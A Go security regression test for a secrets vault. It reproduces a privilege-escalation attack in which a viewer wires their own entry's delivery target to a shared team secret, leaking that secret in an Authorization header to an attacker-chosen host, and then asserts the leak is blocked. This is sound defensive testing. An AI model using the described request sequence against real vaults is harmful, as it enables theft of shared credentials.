package handlers

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"
)

// THE ROUND-6 VIEWER ATTACK, ON THE WIRE.
//
// Six rounds closed six host-choosing FIELDS. This one never writes a
// host-choosing column of the victim's entry at all, so none of those guards is
// on its path.
//
//	attacker: an accepted vault_only VIEWER of a shared collection.
//	          Not an editor. grantFor row 6 gives a viewer read + use and
//	          deliberately NOT manage, so every write gate on the team entry
//	          refuses them and none of them is consulted.
//
//	1. the attacker creates a PERSONAL entry of their own. They are its
//	   creator, so mayDirectSecretEgress says yes about it, correctly.
//	2. PUT /api/vault/{theirOwn}/targets
//	   [{"type":"forgejo_secret","instance":"<attacker host>","repo":"a/b",
//	     "secret_name":"X","auth_token":"team-stripe"}]
//	   Every gate says yes, and every one of them is right: this is their own
//	   entry and they are its owner.
//	3. POST /api/vault/{theirOwn}/rotate with THEIR OWN login password.
//	   deliverToForgejoSecret resolves auth_token as target.ConfiguredBy (the
//	   attacker), entryCurrentlyUsableBy says a viewer may USE team-stripe, and
//	   the team secret's plaintext leaves as
//	       Authorization: token sk_live_TEAM_SECRET
//	   to the attacker's host.
//
// The product's whole model is USE WITHOUT SEE: a viewer may SPEND a shared
// credential and may not learn it (the reveal path re-verifies the caller's
// password; /proxy injects server-side). This turns use into see, with no
// password on the victim's secret and no write to any column of it.
//
// ASSERTIONS READ WHAT A REAL HTTP SERVER RECEIVED. Never a status code.

// headerSink is a real HTTP server that records the request headers, request
// lines and bodies delivered to it.
//
// deliverySink (vault_targets_egress_test.go) records bodies only, and this
// attack carries the stolen secret in a HEADER, so a body-only sink would have
// watched it go past.
type headerSink struct {
	*httptest.Server
	mu      sync.Mutex
	auths   []string
	lines   []string
	payload []string
}

func newHeaderSink(t *testing.T) *headerSink {
	t.Helper()
	s := &headerSink{}
	s.Server = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		s.mu.Lock()
		s.auths = append(s.auths, r.Header.Get("Authorization"))
		s.lines = append(s.lines, r.Method+" "+r.Host+r.URL.Path)
		s.payload = append(s.payload, string(b))
		s.mu.Unlock()
		w.WriteHeader(http.StatusCreated)
	}))
	t.Cleanup(s.Close)
	return s
}

func (s *headerSink) received() (auths, lines, payloads []string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	return append([]string(nil), s.auths...),
		append([]string(nil), s.lines...),
		append([]string(nil), s.payload...)
}

// sawSecret reports whether ANY byte the sink received carries the plaintext,
// wherever it was hidden: header, request line or body.
func (s *headerSink) sawSecret(secret string) bool {
	auths, lines, payloads := s.received()
	for _, group := range [][]string{auths, lines, payloads} {
		for _, v := range group {
			if strings.Contains(v, secret) {
				return true
			}
		}
	}
	return false
}

// viewerAttackEnv is the fixture the attack runs on.
type viewerAttackEnv struct {
	h        *VaultHandler
	operator string
	attacker string
	// teamEntry is the operator's shared secret. The attacker is a VIEWER of the
	// collection holding it.
	teamEntry  string
	teamName   string
	teamSecret string
	// carrier is the attacker's OWN personal entry, the one they may legitimately
	// configure delivery on.
	carrier          string
	attackerPassword string
}

func newViewerAttackEnv(t *testing.T, tag string) *viewerAttackEnv {
	t.Helper()
	swapProviderHTTP(t)

	h, queries := newCollectionAuthzEnv(t)
	const attackerPassword = "attacker-own-login-password"

	env := &viewerAttackEnv{
		h:                h,
		teamName:         "team-stripe",
		teamSecret:       "sk_live_TEAM_SECRET_" + strings.ToUpper(tag),
		teamEntry:        "entry-team-" + tag,
		carrier:          "entry-carrier-" + tag,
		attackerPassword: attackerPassword,
	}
	env.operator = mustUser(t, queries, "r6-operator-"+tag+"@example.com", "user", "operator-login-password")
	// vault_only is the role the PUBLIC invite-redeem endpoint hands out.
	env.attacker = mustUser(t, queries, "r6-viewer-"+tag+"@example.com", "vault_only", attackerPassword)

	mustCollection(t, queries, "coll-"+tag, env.operator, map[string]string{
		env.operator: collRoleManager,
		// VIEWER. Not editor. This is the whole point.
		env.attacker: collRoleViewer,
	})
	mustEntry(t, h, queries, env.teamEntry, env.operator, env.teamName, env.teamSecret)
	placeInCollection(t, queries, env.teamEntry, "coll-"+tag)

	// The attacker's own personal entry. No collection: theirs alone.
	mustEntry(t, h, queries, env.carrier, env.attacker, "attacker-carrier-"+tag, "carrier-seed-value")

	// GUARD THE PREMISE. If the attacker is not really a viewer with USE on the
	// team secret and no manage on it, the run below proves nothing.
	ctx := context.Background()
	g := h.grantFor(ctx, env.attacker, false, env.teamEntry)
	if !g.read || !g.use {
		t.Fatalf("ABORT: the attacker is not an accepted viewer of the team secret (%+v); the attack "+
			"under test needs USE on it", g)
	}
	if g.manage {
		t.Fatalf("ABORT: the attacker has MANAGE on the team secret (%+v); then this is the round-5 "+
			"editor attack, not the round-6 viewer one", g)
	}
	if h.mayConfigureDelivery(ctx, env.attacker, env.teamEntry) {
		t.Fatal("ABORT: the attacker may already configure delivery on the team secret directly; the " +
			"round-6 attack is about NOT needing that")
	}
	if !h.mayConfigureDelivery(ctx, env.attacker, env.carrier) {
		t.Fatal("ABORT: the attacker cannot configure delivery on their OWN entry, so step 2 below is " +
			"not the legitimate act the attack disguises itself as")
	}
	return env
}

// drive runs steps 2 and 3 and returns the PUT and rotate recorders.
func (e *viewerAttackEnv) drive(t *testing.T, sink *headerSink) (put, rotate *httptest.ResponseRecorder) {
	t.Helper()
	body := `[{"type":"forgejo_secret","label":"mine","instance":` + quote(sink.URL) +
		`,"repo":"attacker/repo","secret_name":"STOLEN","auth_token":` + quote(e.teamName) + `}]`
	put = putTargets(t, e.h, e.attacker, "vault_only", e.carrier, body)

	rotate = httptest.NewRecorder()
	e.h.Rotate(rotate, vaultAuthzRequest(http.MethodPost, "/api/vault/"+e.carrier+"/rotate",
		e.attacker, "vault_only", e.carrier, `{"password":`+quote(e.attackerPassword)+`}`))
	if !e.h.WaitForDelivery(30 * time.Second) {
		t.Fatal("rotation delivery did not drain; the wire assertions would be racing it")
	}
	return put, rotate
}

// TestViewerCannotExfiltrateATeamSecretThroughTheirOwnEntrysAuthToken is the
// round-6 attack, driven on the real routes, asserted on the wire.
func TestViewerCannotExfiltrateATeamSecretThroughTheirOwnEntrysAuthToken(t *testing.T) {
	env := newViewerAttackEnv(t, "kill")
	sink := newHeaderSink(t)

	put, rotate := env.drive(t, sink)

	auths, lines, payloads := sink.received()
	if sink.sawSecret(env.teamSecret) {
		t.Fatalf("THE ATTACK SUCCEEDED. A vault_only VIEWER had the team secret delivered to a host "+
			"they chose.\n  auth headers: %q\n  request lines: %q\n  bodies: %q",
			auths, lines, payloads)
	}
	// Nothing at all should have reached the attacker's host. Refusing the
	// exfiltration but still POSTing the carrier's own rotated value would leave
	// the attacker a live channel and a confirmation that the target is wired.
	if len(lines) != 0 {
		t.Errorf("the attacker's host received %v carrying %q; the delivery should not have been "+
			"attempted at all", lines, payloads)
	}
	t.Logf("wire, viewer attack: PUT=%d rotate=%d, attacker host received %d requests",
		put.Code, rotate.Code, len(lines))

	// The refusal has to be VISIBLE. A silent skip on a rotation the attacker
	// drove would hide the attempt from the operator entirely.
	if rotate.Code != http.StatusOK {
		return
	}
	var out struct {
		Status            string `json:"status"`
		LastRotationError string `json:"last_rotation_error"`
	}
	_ = json.Unmarshal(rotate.Body.Bytes(), &out)
	t.Logf("rotate reported: %s", rotate.Body.String())
}

// TestOwnerStillDeliversThroughAnAuthTokenReference is the positive control for
// the same code path: a forgejo_secret delivery that spends a SECOND vault entry
// as its bearer token has to keep working when the person who configured it may
// legitimately choose where that second entry's secret goes.
func TestOwnerStillDeliversThroughAnAuthTokenReference(t *testing.T) {
	swapProviderHTTP(t)
	h, queries := newCollectionAuthzEnv(t)
	sink := newHeaderSink(t)

	const password = "operator-login-password"
	operator := mustUser(t, queries, "pos-operator@example.com", "user", password)

	// The PAT the delivery authenticates with, and the entry whose rotated value
	// is being pushed. Both belong to the operator.
	mustEntry(t, h, queries, "entry-pat", operator, "forgejo-pat", "forgejo_PAT_VALUE")
	mustEntry(t, h, queries, "entry-app", operator, "app-key", "app-key-seed")

	body := `[{"type":"forgejo_secret","label":"ci","instance":` + quote(sink.URL) +
		`,"repo":"team/app","secret_name":"APP_KEY","auth_token":"forgejo-pat"}]`
	if rec := putTargets(t, h, operator, "user", "entry-app", body); rec.Code != http.StatusOK {
		t.Fatalf("the entry's owner could not configure a forgejo delivery target (%d: %s)",
			rec.Code, rec.Body.String())
	}

	rec := httptest.NewRecorder()
	h.Rotate(rec, vaultAuthzRequest(http.MethodPost, "/api/vault/entry-app/rotate",
		operator, "user", "entry-app", `{"password":`+quote(password)+`}`))
	if rec.Code != http.StatusOK {
		t.Fatalf("the operator could not rotate their own entry (%d: %s)", rec.Code, rec.Body.String())
	}
	if !h.WaitForDelivery(30 * time.Second) {
		t.Fatal("rotation delivery did not drain")
	}

	auths, lines, payloads := sink.received()
	if len(lines) == 0 {
		t.Fatal("THE FEATURE IS BROKEN. The operator's own forgejo target received nothing, so the " +
			"gate is refusing the legitimate configurer")
	}
	if !sink.sawSecret("forgejo_PAT_VALUE") {
		t.Fatalf("the delivery did not carry the operator's PAT as its bearer token: auths=%q", auths)
	}
	var pushed struct {
		Data string `json:"data"`
	}
	if err := json.Unmarshal([]byte(payloads[0]), &pushed); err != nil {
		t.Fatalf("the sink received something that is not a forgejo secret payload (%q): %v", payloads[0], err)
	}
	if pushed.Data == "" || pushed.Data == "app-key-seed" {
		t.Fatalf("the pushed value is %q; want the freshly ROTATED value for app-key", pushed.Data)
	}
	t.Logf("wire, owner-configured auth_token reference: %v, bearer carried, rotated value pushed", lines)
}
